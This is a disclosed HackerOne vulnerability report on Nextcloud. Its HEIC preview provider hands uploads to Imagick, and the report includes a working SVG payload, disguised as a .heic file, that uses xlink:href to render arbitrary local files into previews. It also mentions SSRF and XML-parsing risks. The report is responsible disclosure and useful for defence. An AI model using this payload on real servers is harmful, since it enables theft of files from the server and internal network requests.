# HEIC image preview can be used to invoke Imagick

## Report Details
- **Report ID**: 1261413
- **URL**: https://hackerone.com/reports/1261413
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-07-14T13:21:35.249Z
- **Disclosed**: 2023-01-07T09:55:38.085Z

## Reporter
- **Username**: lukasreschkenc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
The HEIC image preview provider calls into Imagick at https://github.com/nextcloud/server/blob/5d097ddb4b99673f57b8c085dedd93880ee2539d/lib/private/Preview/HEIC.php#L98-L109. This is bad as Imagick processes all kind of image types.

One can use this for example to exfiltrate arbitrary files by passing a SVG file that contains a `xlink:href` to a locally existing file. There are also other concerns with regard to SSRF and XML parsing done by Imagick.

A super naive example, uploading a file such as "test.heic" with this content will render the file "nextcloud20.png" inside it. (but you can also reference PDFs, or use it for SSRF, etc etc.

`test.heic`:
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="500"
   height="500">
    <image x="0" y="0" width="500" height="500" xlink:href="/Users/lukasreschke/Downloads/nextcloud20.png" stroke-width="1" id="image3204" />
</svg>
```

Preview:

{F1376376}

## Impact

Gaining access to arbitrary files on the system, SSRF, etc.

## Attachments
- Screenshot_2021-07-14_at_15.21.03.png
